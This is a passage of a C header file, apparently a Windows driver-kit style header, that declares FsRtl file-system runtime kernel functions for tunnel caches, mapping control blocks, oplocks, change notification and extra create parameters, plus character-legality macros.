FsRtlInitializeTunnelCache(
  IN PTUNNEL Cache);

NTKERNELAPI
VOID
NTAPI
FsRtlAddToTunnelCache(
  IN PTUNNEL Cache,
  IN ULONGLONG DirectoryKey,
  IN PUNICODE_STRING ShortName,
  IN PUNICODE_STRING LongName,
  IN BOOLEAN KeyByShortName,
  IN ULONG DataLength,
  IN PVOID Data);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlFindInTunnelCache(
  IN PTUNNEL Cache,
  IN ULONGLONG DirectoryKey,
  IN PUNICODE_STRING Name,
  OUT PUNICODE_STRING ShortName,
  OUT PUNICODE_STRING LongName,
  IN OUT PULONG DataLength,
  OUT PVOID Data);

NTKERNELAPI
VOID
NTAPI
FsRtlDeleteKeyFromTunnelCache(
  IN PTUNNEL Cache,
  IN ULONGLONG DirectoryKey);

NTKERNELAPI
VOID
NTAPI
FsRtlDeleteTunnelCache(
  IN PTUNNEL Cache);

NTKERNELAPI
VOID
NTAPI
FsRtlDissectDbcs(
  IN ANSI_STRING Name,
  OUT PANSI_STRING FirstPart,
  OUT PANSI_STRING RemainingPart);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlDoesDbcsContainWildCards(
  IN PANSI_STRING Name);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsDbcsInExpression(
  IN PANSI_STRING Expression,
  IN PANSI_STRING Name);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsFatDbcsLegal(
  IN ANSI_STRING DbcsName,
  IN BOOLEAN WildCardsPermissible,
  IN BOOLEAN PathNamePermissible,
  IN BOOLEAN LeadingBackslashPermissible);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsHpfsDbcsLegal(
  IN ANSI_STRING DbcsName,
  IN BOOLEAN WildCardsPermissible,
  IN BOOLEAN PathNamePermissible,
  IN BOOLEAN LeadingBackslashPermissible);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlNormalizeNtstatus(
  IN NTSTATUS Exception,
  IN NTSTATUS GenericException);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsNtstatusExpected(
  IN NTSTATUS Ntstatus);

NTKERNELAPI
PERESOURCE
NTAPI
FsRtlAllocateResource(
  VOID);

NTKERNELAPI
VOID
NTAPI
FsRtlInitializeLargeMcb(
  IN PLARGE_MCB Mcb,
  IN POOL_TYPE PoolType);

NTKERNELAPI
VOID
NTAPI
FsRtlUninitializeLargeMcb(
  IN PLARGE_MCB Mcb);

NTKERNELAPI
VOID
NTAPI
FsRtlResetLargeMcb(
  IN PLARGE_MCB Mcb,
  IN BOOLEAN SelfSynchronized);

NTKERNELAPI
VOID
NTAPI
FsRtlTruncateLargeMcb(
  IN PLARGE_MCB Mcb,
  IN LONGLONG Vbn);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlAddLargeMcbEntry(
  IN PLARGE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG Lbn,
  IN LONGLONG SectorCount);

NTKERNELAPI
VOID
NTAPI
FsRtlRemoveLargeMcbEntry(
  IN PLARGE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupLargeMcbEntry(
  IN PLARGE_MCB Mcb,
  IN LONGLONG Vbn,
  OUT PLONGLONG Lbn OPTIONAL,
  OUT PLONGLONG SectorCountFromLbn OPTIONAL,
  OUT PLONGLONG StartingLbn OPTIONAL,
  OUT PLONGLONG SectorCountFromStartingLbn OPTIONAL,
  OUT PULONG Index OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupLastLargeMcbEntry(
  IN PLARGE_MCB Mcb,
  OUT PLONGLONG Vbn,
  OUT PLONGLONG Lbn);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupLastLargeMcbEntryAndIndex(
  IN PLARGE_MCB OpaqueMcb,
  OUT PLONGLONG LargeVbn,
  OUT PLONGLONG LargeLbn,
  OUT PULONG Index);

NTKERNELAPI
ULONG
NTAPI
FsRtlNumberOfRunsInLargeMcb(
  IN PLARGE_MCB Mcb);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlGetNextLargeMcbEntry(
  IN PLARGE_MCB Mcb,
  IN ULONG RunIndex,
  OUT PLONGLONG Vbn,
  OUT PLONGLONG Lbn,
  OUT PLONGLONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlSplitLargeMcb(
  IN PLARGE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG Amount);

NTKERNELAPI
VOID
NTAPI
FsRtlInitializeMcb(
  IN PMCB Mcb,
  IN POOL_TYPE PoolType);

NTKERNELAPI
VOID
NTAPI
FsRtlUninitializeMcb(
  IN PMCB Mcb);

NTKERNELAPI
VOID
NTAPI
FsRtlTruncateMcb(
  IN PMCB Mcb,
  IN VBN Vbn);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlAddMcbEntry(
  IN PMCB Mcb,
  IN VBN Vbn,
  IN LBN Lbn,
  IN ULONG SectorCount);

NTKERNELAPI
VOID
NTAPI
FsRtlRemoveMcbEntry(
  IN PMCB Mcb,
  IN VBN Vbn,
  IN ULONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupMcbEntry(
  IN PMCB Mcb,
  IN VBN Vbn,
  OUT PLBN Lbn,
  OUT PULONG SectorCount OPTIONAL,
  OUT PULONG Index);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupLastMcbEntry(
  IN PMCB Mcb,
  OUT PVBN Vbn,
  OUT PLBN Lbn);

NTKERNELAPI
ULONG
NTAPI
FsRtlNumberOfRunsInMcb(
  IN PMCB Mcb);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlGetNextMcbEntry(
  IN PMCB Mcb,
  IN ULONG RunIndex,
  OUT PVBN Vbn,
  OUT PLBN Lbn,
  OUT PULONG SectorCount);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlBalanceReads(
  IN PDEVICE_OBJECT TargetDevice);

NTKERNELAPI
VOID
NTAPI
FsRtlInitializeOplock(
  IN OUT POPLOCK Oplock);

NTKERNELAPI
VOID
NTAPI
FsRtlUninitializeOplock(
  IN OUT POPLOCK Oplock);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlOplockFsctrl(
  IN POPLOCK Oplock,
  IN PIRP Irp,
  IN ULONG OpenCount);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlCheckOplock(
  IN POPLOCK Oplock,
  IN PIRP Irp,
  IN PVOID Context,
  IN POPLOCK_WAIT_COMPLETE_ROUTINE CompletionRoutine OPTIONAL,
  IN POPLOCK_FS_PREPOST_IRP PostIrpRoutine OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlOplockIsFastIoPossible(
  IN POPLOCK Oplock);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCurrentBatchOplock(
  IN POPLOCK Oplock);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlNotifyVolumeEvent(
  IN PFILE_OBJECT FileObject,
  IN ULONG EventCode);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyInitializeSync(
  IN PNOTIFY_SYNC *NotifySync);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyUninitializeSync(
  IN PNOTIFY_SYNC *NotifySync);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyFullChangeDirectory(
  IN PNOTIFY_SYNC NotifySync,
  IN PLIST_ENTRY NotifyList,
  IN PVOID FsContext,
  IN PSTRING FullDirectoryName,
  IN BOOLEAN WatchTree,
  IN BOOLEAN IgnoreBuffer,
  IN ULONG CompletionFilter,
  IN PIRP NotifyIrp OPTIONAL,
  IN PCHECK_FOR_TRAVERSE_ACCESS TraverseCallback OPTIONAL,
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyFilterReportChange(
  IN PNOTIFY_SYNC NotifySync,
  IN PLIST_ENTRY NotifyList,
  IN PSTRING FullTargetName,
  IN USHORT TargetNameOffset,
  IN PSTRING StreamName OPTIONAL,
  IN PSTRING NormalizedParentName OPTIONAL,
  IN ULONG FilterMatch,
  IN ULONG Action,
  IN PVOID TargetContext OPTIONAL,
  IN PVOID FilterContext OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyFullReportChange(
  IN PNOTIFY_SYNC NotifySync,
  IN PLIST_ENTRY NotifyList,
  IN PSTRING FullTargetName,
  IN USHORT TargetNameOffset,
  IN PSTRING StreamName OPTIONAL,
  IN PSTRING NormalizedParentName OPTIONAL,
  IN ULONG FilterMatch,
  IN ULONG Action,
  IN PVOID TargetContext OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyCleanup(
  IN PNOTIFY_SYNC NotifySync,
  IN PLIST_ENTRY NotifyList,
  IN PVOID FsContext);

NTKERNELAPI
VOID
NTAPI
FsRtlDissectName(
  IN UNICODE_STRING Name,
  OUT PUNICODE_STRING FirstPart,
  OUT PUNICODE_STRING RemainingPart);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlDoesNameContainWildCards(
  IN PUNICODE_STRING Name);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlAreNamesEqual(
  IN PCUNICODE_STRING Name1,
  IN PCUNICODE_STRING Name2,
  IN BOOLEAN IgnoreCase,
  IN PCWCH UpcaseTable OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsNameInExpression(
  IN PUNICODE_STRING Expression,
  IN PUNICODE_STRING Name,
  IN BOOLEAN IgnoreCase,
  IN PWCHAR UpcaseTable OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlPostPagingFileStackOverflow(
  IN PVOID Context,
  IN PKEVENT Event,
  IN PFSRTL_STACK_OVERFLOW_ROUTINE StackOverflowRoutine);

NTKERNELAPI
VOID
NTAPI
FsRtlPostStackOverflow (
  IN PVOID Context,
  IN PKEVENT Event,
  IN PFSRTL_STACK_OVERFLOW_ROUTINE StackOverflowRoutine);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlRegisterUncProvider(
  OUT PHANDLE MupHandle,
  IN PUNICODE_STRING RedirectorDeviceName,
  IN BOOLEAN MailslotsSupported);

NTKERNELAPI
VOID
NTAPI
FsRtlDeregisterUncProvider(
  IN HANDLE Handle);

NTKERNELAPI
VOID
NTAPI
FsRtlTeardownPerStreamContexts(
  IN PFSRTL_ADVANCED_FCB_HEADER AdvancedHeader);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlCreateSectionForDataScan(
  OUT PHANDLE SectionHandle,
  OUT PVOID *SectionObject,
  OUT PLARGE_INTEGER SectionFileSize OPTIONAL,
  IN PFILE_OBJECT FileObject,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER MaximumSize OPTIONAL,
  IN ULONG SectionPageProtection,
  IN ULONG AllocationAttributes,
  IN ULONG Flags);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyFilterChangeDirectory(
  IN PNOTIFY_SYNC NotifySync,
  IN PLIST_ENTRY NotifyList,
  IN PVOID FsContext,
  IN PSTRING FullDirectoryName,
  IN BOOLEAN WatchTree,
  IN BOOLEAN IgnoreBuffer,
  IN ULONG CompletionFilter,
  IN PIRP NotifyIrp OPTIONAL,
  IN PCHECK_FOR_TRAVERSE_ACCESS TraverseCallback OPTIONAL,
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext OPTIONAL,
  IN PFILTER_REPORT_CHANGE FilterCallback OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlInsertPerStreamContext(
  IN PFSRTL_ADVANCED_FCB_HEADER PerStreamContext,
  IN PFSRTL_PER_STREAM_CONTEXT Ptr);

NTKERNELAPI
PFSRTL_PER_STREAM_CONTEXT
NTAPI
FsRtlLookupPerStreamContextInternal(
  IN PFSRTL_ADVANCED_FCB_HEADER StreamContext,
  IN PVOID OwnerId OPTIONAL,
  IN PVOID InstanceId OPTIONAL);

NTKERNELAPI
PFSRTL_PER_STREAM_CONTEXT
NTAPI
FsRtlRemovePerStreamContext(
  IN PFSRTL_ADVANCED_FCB_HEADER StreamContext,
  IN PVOID OwnerId OPTIONAL,
  IN PVOID InstanceId OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlIncrementCcFastReadNotPossible(
  VOID);

NTKERNELAPI
VOID
NTAPI
FsRtlIncrementCcFastReadWait(
  VOID);

NTKERNELAPI
VOID
NTAPI
FsRtlIncrementCcFastReadNoWait(
  VOID);

NTKERNELAPI
VOID
NTAPI
FsRtlIncrementCcFastReadResourceMiss(
  VOID);

NTKERNELAPI
LOGICAL
NTAPI
FsRtlIsPagingFile(
  IN PFILE_OBJECT FileObject);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)

NTKERNELAPI
VOID
NTAPI
FsRtlInitializeBaseMcb(
  IN PBASE_MCB Mcb,
  IN POOL_TYPE PoolType);

NTKERNELAPI
VOID
NTAPI
FsRtlUninitializeBaseMcb(
  IN PBASE_MCB Mcb);

NTKERNELAPI
VOID
NTAPI
FsRtlResetBaseMcb(
  IN PBASE_MCB Mcb);

NTKERNELAPI
VOID
NTAPI
FsRtlTruncateBaseMcb(
  IN PBASE_MCB Mcb,
  IN LONGLONG Vbn);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlAddBaseMcbEntry(
  IN PBASE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG Lbn,
  IN LONGLONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlRemoveBaseMcbEntry(
  IN PBASE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupBaseMcbEntry(
  IN PBASE_MCB Mcb,
  IN LONGLONG Vbn,
  OUT PLONGLONG Lbn OPTIONAL,
  OUT PLONGLONG SectorCountFromLbn OPTIONAL,
  OUT PLONGLONG StartingLbn OPTIONAL,
  OUT PLONGLONG SectorCountFromStartingLbn OPTIONAL,
  OUT PULONG Index OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupLastBaseMcbEntry(
  IN PBASE_MCB Mcb,
  OUT PLONGLONG Vbn,
  OUT PLONGLONG Lbn);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlLookupLastBaseMcbEntryAndIndex(
  IN PBASE_MCB OpaqueMcb,
  IN OUT PLONGLONG LargeVbn,
  IN OUT PLONGLONG LargeLbn,
  IN OUT PULONG Index);

NTKERNELAPI
ULONG
NTAPI
FsRtlNumberOfRunsInBaseMcb(
  IN PBASE_MCB Mcb);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlGetNextBaseMcbEntry(
  IN PBASE_MCB Mcb,
  IN ULONG RunIndex,
  OUT PLONGLONG Vbn,
  OUT PLONGLONG Lbn,
  OUT PLONGLONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlSplitBaseMcb(
  IN PBASE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG Amount);

#endif /* (NTDDI_VERSION >= NTDDI_WS03) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

BOOLEAN
NTAPI
FsRtlInitializeBaseMcbEx(
  IN PBASE_MCB Mcb,
  IN POOL_TYPE PoolType,
  IN USHORT Flags);

NTSTATUS
NTAPI
FsRtlAddBaseMcbEntryEx(
  IN PBASE_MCB Mcb,
  IN LONGLONG Vbn,
  IN LONGLONG Lbn,
  IN LONGLONG SectorCount);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCurrentOplock(
  IN POPLOCK Oplock);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlOplockBreakToNone(
  IN OUT POPLOCK Oplock,
  IN PIO_STACK_LOCATION IrpSp OPTIONAL,
  IN PIRP Irp,
  IN PVOID Context OPTIONAL,
  IN POPLOCK_WAIT_COMPLETE_ROUTINE CompletionRoutine OPTIONAL,
  IN POPLOCK_FS_PREPOST_IRP PostIrpRoutine OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlNotifyVolumeEventEx(
  IN PFILE_OBJECT FileObject,
  IN ULONG EventCode,
  IN PTARGET_DEVICE_CUSTOM_NOTIFICATION Event);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyCleanupAll(
  IN PNOTIFY_SYNC NotifySync,
  IN PLIST_ENTRY NotifyList);

NTSTATUS
NTAPI
FsRtlRegisterUncProviderEx(
  OUT PHANDLE MupHandle,
  IN PUNICODE_STRING RedirDevName,
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG Flags);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlCancellableWaitForSingleObject(
  IN PVOID Object,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  IN PIRP Irp OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlCancellableWaitForMultipleObjects(
  IN ULONG Count,
  IN PVOID ObjectArray[],
  IN WAIT_TYPE WaitType,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  IN PKWAIT_BLOCK WaitBlockArray OPTIONAL,
  IN PIRP Irp OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlMupGetProviderInfoFromFileObject(
  IN PFILE_OBJECT pFileObject,
  IN ULONG Level,
  OUT PVOID pBuffer,
  IN OUT PULONG pBufferSize);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlMupGetProviderIdFromName(
  IN PUNICODE_STRING pProviderName,
  OUT PULONG32 pProviderId);

NTKERNELAPI
VOID
NTAPI
FsRtlIncrementCcFastMdlReadWait(
  VOID);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlValidateReparsePointBuffer(
  IN ULONG BufferLength,
  IN PREPARSE_DATA_BUFFER ReparseBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlRemoveDotsFromPath(
  IN OUT PWSTR OriginalString,
  IN USHORT PathLength,
  OUT USHORT *NewLength);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlAllocateExtraCreateParameterList(
  IN FSRTL_ALLOCATE_ECPLIST_FLAGS Flags,
  OUT PECP_LIST *EcpList);

NTKERNELAPI
VOID
NTAPI
FsRtlFreeExtraCreateParameterList(
  IN PECP_LIST EcpList);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlAllocateExtraCreateParameter(
  IN LPCGUID EcpType,
  IN ULONG SizeOfContext,
  IN FSRTL_ALLOCATE_ECP_FLAGS Flags,
  IN PFSRTL_EXTRA_CREATE_PARAMETER_CLEANUP_CALLBACK CleanupCallback OPTIONAL,
  IN ULONG PoolTag,
  OUT PVOID *EcpContext);

NTKERNELAPI
VOID
NTAPI
FsRtlFreeExtraCreateParameter(
  IN PVOID EcpContext);

NTKERNELAPI
VOID
NTAPI
FsRtlInitExtraCreateParameterLookasideList(
  IN OUT PVOID Lookaside,
  IN FSRTL_ECP_LOOKASIDE_FLAGS Flags,
  IN SIZE_T Size,
  IN ULONG Tag);

VOID
NTAPI
FsRtlDeleteExtraCreateParameterLookasideList(
  IN OUT PVOID Lookaside,
  IN FSRTL_ECP_LOOKASIDE_FLAGS Flags);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlAllocateExtraCreateParameterFromLookasideList(
  IN LPCGUID EcpType,
  IN ULONG SizeOfContext,
  IN FSRTL_ALLOCATE_ECP_FLAGS Flags,
  IN PFSRTL_EXTRA_CREATE_PARAMETER_CLEANUP_CALLBACK CleanupCallback OPTIONAL,
  IN OUT PVOID LookasideList,
  OUT PVOID *EcpContext);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlInsertExtraCreateParameter(
  IN OUT PECP_LIST EcpList,
  IN OUT PVOID EcpContext);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlFindExtraCreateParameter(
  IN PECP_LIST EcpList,
  IN LPCGUID EcpType,
  OUT PVOID *EcpContext OPTIONAL,
  OUT ULONG *EcpContextSize OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlRemoveExtraCreateParameter(
  IN OUT PECP_LIST EcpList,
  IN LPCGUID EcpType,
  OUT PVOID *EcpContext,
  OUT ULONG *EcpContextSize OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlGetEcpListFromIrp(
  IN PIRP Irp,
  OUT PECP_LIST *EcpList OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlSetEcpListIntoIrp(
  IN OUT PIRP Irp,
  IN PECP_LIST EcpList);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlGetNextExtraCreateParameter(
  IN PECP_LIST EcpList,
  IN PVOID CurrentEcpContext OPTIONAL,
  OUT LPGUID NextEcpType OPTIONAL,
  OUT PVOID *NextEcpContext OPTIONAL,
  OUT ULONG *NextEcpContextSize OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlAcknowledgeEcp(
  IN PVOID EcpContext);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsEcpAcknowledged(
  IN PVOID EcpContext);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsEcpFromUserMode(
  IN PVOID EcpContext);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlChangeBackingFileObject(
  IN PFILE_OBJECT CurrentFileObject OPTIONAL,
  IN PFILE_OBJECT NewFileObject,
  IN FSRTL_CHANGE_BACKING_TYPE ChangeBackingType,
  IN ULONG Flags);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlLogCcFlushError(
  IN PUNICODE_STRING FileName,
  IN PDEVICE_OBJECT DeviceObject,
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN NTSTATUS FlushError,
  IN ULONG Flags);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlAreVolumeStartupApplicationsComplete(
  VOID);

NTKERNELAPI
ULONG
NTAPI
FsRtlQueryMaximumVirtualDiskNestingLevel(
  VOID);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlGetVirtualDiskNestingLevel(
  IN PDEVICE_OBJECT DeviceObject,
  OUT PULONG NestingLevel,
  OUT PULONG NestingFlags OPTIONAL);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_VISTASP1)
NTKERNELAPI
NTSTATUS
NTAPI
FsRtlCheckOplockEx(
  IN POPLOCK Oplock,
  IN PIRP Irp,
  IN ULONG Flags,
  IN PVOID Context OPTIONAL,
  IN POPLOCK_WAIT_COMPLETE_ROUTINE CompletionRoutine OPTIONAL,
  IN POPLOCK_FS_PREPOST_IRP PostIrpRoutine OPTIONAL);

#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlAreThereCurrentOrInProgressFileLocks(
  IN PFILE_LOCK FileLock);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlOplockIsSharedRequest(
  IN PIRP Irp);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlOplockBreakH(
  IN POPLOCK Oplock,
  IN PIRP Irp,
  IN ULONG Flags,
  IN PVOID Context OPTIONAL,
  IN POPLOCK_WAIT_COMPLETE_ROUTINE CompletionRoutine OPTIONAL,
  IN POPLOCK_FS_PREPOST_IRP PostIrpRoutine OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCurrentOplockH(
  IN POPLOCK Oplock);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlOplockBreakToNoneEx(
  IN OUT POPLOCK Oplock,
  IN PIRP Irp,
  IN ULONG Flags,
  IN PVOID Context OPTIONAL,
  IN POPLOCK_WAIT_COMPLETE_ROUTINE CompletionRoutine OPTIONAL,
  IN POPLOCK_FS_PREPOST_IRP PostIrpRoutine OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlOplockFsctrlEx(
  IN POPLOCK Oplock,
  IN PIRP Irp,
  IN ULONG OpenCount,
  IN ULONG Flags);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlOplockKeysEqual(
  IN PFILE_OBJECT Fo1 OPTIONAL,
  IN PFILE_OBJECT Fo2 OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlInitializeExtraCreateParameterList(
  IN OUT PECP_LIST EcpList);

NTKERNELAPI
VOID
NTAPI
FsRtlInitializeExtraCreateParameter(
  IN PECP_HEADER Ecp,
  IN ULONG EcpFlags,
  IN PFSRTL_EXTRA_CREATE_PARAMETER_CLEANUP_CALLBACK CleanupCallback OPTIONAL,
  IN ULONG TotalSize,
  IN LPCGUID EcpType,
  IN PVOID ListAllocatedFrom OPTIONAL);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlInsertPerFileContext(
  IN PVOID* PerFileContextPointer,
  IN PFSRTL_PER_FILE_CONTEXT Ptr);

NTKERNELAPI
PFSRTL_PER_FILE_CONTEXT
NTAPI
FsRtlLookupPerFileContext(
  IN PVOID* PerFileContextPointer,
  IN PVOID OwnerId OPTIONAL,
  IN PVOID InstanceId OPTIONAL);

NTKERNELAPI
PFSRTL_PER_FILE_CONTEXT
NTAPI
FsRtlRemovePerFileContext(
  IN PVOID* PerFileContextPointer,
  IN PVOID OwnerId OPTIONAL,
  IN PVOID InstanceId OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlTeardownPerFileContexts(
  IN PVOID* PerFileContextPointer);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlInsertPerFileObjectContext(
  IN PFILE_OBJECT FileObject,
  IN PFSRTL_PER_FILEOBJECT_CONTEXT Ptr);

NTKERNELAPI
PFSRTL_PER_FILEOBJECT_CONTEXT
NTAPI
FsRtlLookupPerFileObjectContext(
  IN PFILE_OBJECT FileObject,
  IN PVOID OwnerId OPTIONAL,
  IN PVOID InstanceId OPTIONAL);

NTKERNELAPI
PFSRTL_PER_FILEOBJECT_CONTEXT
NTAPI
FsRtlRemovePerFileObjectContext(
  IN PFILE_OBJECT FileObject,
  IN PVOID OwnerId OPTIONAL,
  IN PVOID InstanceId OPTIONAL);

#define FsRtlFastLock(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10, A11) (       \
     FsRtlPrivateLock(A1, A2, A3, A4, A5, A6, A7, A8, A9, NULL, A10, A11)   \
)

#define FsRtlAreThereCurrentFileLocks(FL) ( \
    ((FL)->FastIoIsQuestionable)            \
)

#define FsRtlIncrementLockRequestsInProgress(FL) {                           \
    ASSERT( (FL)->LockRequestsInProgress >= 0 );                             \
    (void)                                                                   \
    (InterlockedIncrement((LONG volatile *)&((FL)->LockRequestsInProgress)));\
}

#define FsRtlDecrementLockRequestsInProgress(FL) {                           \
    ASSERT( (FL)->LockRequestsInProgress > 0 );                              \
    (void)                                                                   \
    (InterlockedDecrement((LONG volatile *)&((FL)->LockRequestsInProgress)));\
}

/* GCC compatible definition, MS one is retarded */
extern NTKERNELAPI const UCHAR * const FsRtlLegalAnsiCharacterArray;
#define LEGAL_ANSI_CHARACTER_ARRAY        FsRtlLegalAnsiCharacterArray

#define FsRtlIsAnsiCharacterWild(C) (                                       \
    FlagOn(FsRtlLegalAnsiCharacterArray[(UCHAR)(C)], FSRTL_WILD_CHARACTER ) \
)

#define FsRtlIsAnsiCharacterLegalFat(C, WILD) (                                \
    FlagOn(FsRtlLegalAnsiCharacterArray[(UCHAR)(C)], (FSRTL_FAT_LEGAL) |       \
                                        ((WILD) ? FSRTL_WILD_CHARACTER : 0 ))  \
)

#define FsRtlIsAnsiCharacterLegalHpfs(C, WILD) (                               \
    FlagOn(FsRtlLegalAnsiCharacterArray[(UCHAR)(C)], (FSRTL_HPFS_LEGAL) |      \
                                        ((WILD) ? FSRTL_WILD_CHARACTER : 0 ))  \
)

#define FsRtlIsAnsiCharacterLegalNtfs(C, WILD) (                               \
    FlagOn(FsRtlLegalAnsiCharacterArray[(UCHAR)(C)], (FSRTL_NTFS_LEGAL) |      \
                                        ((WILD) ? FSRTL_WILD_CHARACTER : 0 ))  \
)

#define FsRtlIsAnsiCharacterLegalNtfsStream(C,WILD_OK) (                    \
    FsRtlTestAnsiCharacter((C), TRUE, (WILD_OK), FSRTL_NTFS_STREAM_LEGAL)   \
)

#define FsRtlIsAnsiCharacterLegal(C,FLAGS) (          \
    FsRtlTestAnsiCharacter((C), TRUE, FALSE, (FLAGS)) \
)

#define FsRtlTestAnsiCharacter(C, DEFAULT_RET, WILD_OK, FLAGS) (            \
        ((SCHAR)(C) < 0) ? DEFAULT_RET :                                    \
                           FlagOn( LEGAL_ANSI_CHARACTER_ARRAY[(C)],         \
                                   (FLAGS) |                                \
                                   ((WILD_OK) ? FSRTL_WILD_CHARACTER : 0) ) \
)

#define FsRtlIsLeadDbcsCharacter(DBCS_CHAR) (                               \
    (BOOLEAN)((UCHAR)(DBCS_CHAR) < 0x80 ? FALSE :                           \
              (NLS_MB_CODE_PAGE_TAG &&                                      \
               (NLS_OEM_LEAD_BYTE_INFO[(UCHAR)(DBCS_CHAR)] != 0)))          \
)

#define FsRtlIsUnicodeCharacterWild(C) (                                    \
    (((C) >= 0x40) ?                                                        \
    FALSE :                                                                 \
    FlagOn(FsRtlLegalAnsiCharacterArray[(C)], FSRTL_WILD_CHARACTER ))       \
)

#define FsRtlInitPerFileContext( _fc, _owner, _inst, _cb)   \
    ((_fc)->OwnerId = (_owner),                               \
     (_fc)->InstanceId = (_inst),                             \
     (_fc)->FreeCallback = (_cb))

